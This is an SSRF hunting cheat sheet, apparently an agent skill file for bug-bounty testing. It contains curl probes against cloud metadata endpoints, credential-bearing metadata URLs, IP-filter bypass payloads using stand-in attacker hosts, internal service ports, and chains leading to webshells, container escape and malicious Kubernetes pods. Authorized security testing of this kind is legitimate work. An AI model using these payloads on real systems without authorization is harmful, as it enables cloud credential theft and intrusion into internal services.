---
name: hunt-ssrf
description: SSRF — cloud metadata, internal service access, DNS rebinding, 11 IP bypasses. Must prove internal resource access.
---

# SSRF HUNTING — 3 BULLETS MAX

**Core:** Server fetching INTERNAL URLs it shouldn't reach.

## DIFFERENTIAL
```bash
TARGET="https://target.com/fetch?url="
# Baseline: external works
curl -s "${TARGET}http://httpbin.org/ip"
# Test: cloud metadata → should FAIL
curl -s "${TARGET}http://169.254.169.254/latest/meta-data/"
# Test: localhost → should FAIL
curl -s "${TARGET}http://localhost:6379"
```

## CLOUD METADATA
```
AWS:    http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP:    http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google)
Azure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Header: Metadata: true)
```

## IP BYPASS (11 techniques)
```
Decimal: http://2130706433    Octal: http://0177.0.0.1
Hex: http://0x7f.0x0.0x0.0x1  Short: http://127.1
IPv6: http://[::1]            Mapped: http://[::ffff:127.0.0.1]
DNS rebinding: attacker.com → 127.0.0.1
Redirect chain: external URL → 302 → internal
URL parser: http://evil.com#@internal
CNAME: attacker domain → internal hostname
Unicode: http://127。0。0。1
```

## INTERNAL FINGERPRINTING
```
Redis: localhost:6379    Elasticsearch: localhost:9200
Docker: localhost:2375   K8s: localhost:6443
Jenkins: localhost:8080  Grafana: localhost:3000
etcd: localhost:2379     Consul: localhost:8500
```

## CHAINS
```
SSRF → cloud metadata → IAM keys → RCE          ($500 → $500K)
SSRF → Redis → write webshell → RCE              ($1K → $100K)
SSRF → Docker API → privileged container → escape ($5K → $100K)
SSRF → K8s API → deploy malicious pod → RCE       ($5K → $100K)
```

## FALSE POSITIVES
- DNS callback only → need actual internal resource ACCESS
- Server fetches external URLs → normal behavior
- Timeout on internal → correctly filtered
